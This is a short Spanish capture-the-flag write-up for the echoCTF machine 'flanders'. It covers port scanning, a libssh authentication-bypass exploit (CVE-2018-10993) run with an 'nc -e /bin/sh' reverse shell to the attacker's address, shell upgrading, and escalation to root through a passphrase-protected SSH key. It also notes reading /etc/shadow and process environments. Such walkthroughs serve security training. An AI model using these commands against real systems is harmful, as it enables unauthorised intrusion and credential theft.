# flanders-echoctf
Resolucion de la maquina


## NMAP


```
sudo nmap -sS -p- -n --min-rate 500  10.0.100.34
sudo nmap -sSVC  -p6022  10.0.100.34
```

Encontramos un puerto raro nos dice que es un servicio que no sabemos que es deje el nc conectado


![image](https://github.com/gecr07/flanders-echoctf/assets/63270579/e5ace1bc-53ff-4640-b9cf-0cca398bb39b)

## RCE

Buscamos exploits para esa version de libssh no tenemos usuario osea seria no autenticado. Y encontre  cve-2018-10993.py  que si jalo


```
nc -lvnp 443

python3 cve-2018-10993.py 10.0.100.34 -p 6022 -v -c 'nc -e /bin/sh 10.10.5.82 443'

```

### Fully TTY

```
python -c "import pty;pty.spawn('/bin/bash')"

```

### Alternativa a netstat

Si no se tiene netstat se puede usar la siguiente alternativa

```
ss -ant

```

##### TMUX 

Volver un panel a una ventana compelta


```
CTL + b + !

# Copiar / Pegar con tmux.

0 - [Cntrl + b] + "PgUp" o "["   Permite entrar el modo copia y usar el scrolling (q para salir).
1 - Ir a la linea a partir de la cual se quier copiar.
2 - [Cntrl + Barra espaciadora]
3 - Mover con los cursores para seleccionar lo que se quiere copiar. 
4 - [Alt + w]   Copia el texto seleccionado en el paso anterior.
5 - [Cntrl + b] + "]"   Pega el contenido copiado.


```

![image](https://github.com/gecr07/flanders-echoctf/assets/63270579/0eb5ec63-f20e-48b1-b7e1-054a90e6e093)

Encontramos un puerto 22 en escucha:

```
ps -eafww
ssh -i .ssh/mykey root@127.0.0.1
```

Vemos que se esta ejecutando ese ssh como root lo tomamos!

> Now we see that port 22 is open but only localhost can connect on further search with "ps -eafww" I found that ssh is running as root and listening on this port I used the key found earlier to connect to the localhost via ssh using ssh -i .ssh/mykey root@127.0.0.1 but the key is encrypted with some passphrase by looking at the machine's description the catch phrase is "Okily Dokily" it didn't work in the first try but when I removed the space it worked and we are root now LOCATION OF FLAGS: /root/ /etc/passwd /etc/shadow strings /proc/*/environ | grep ETSCTF








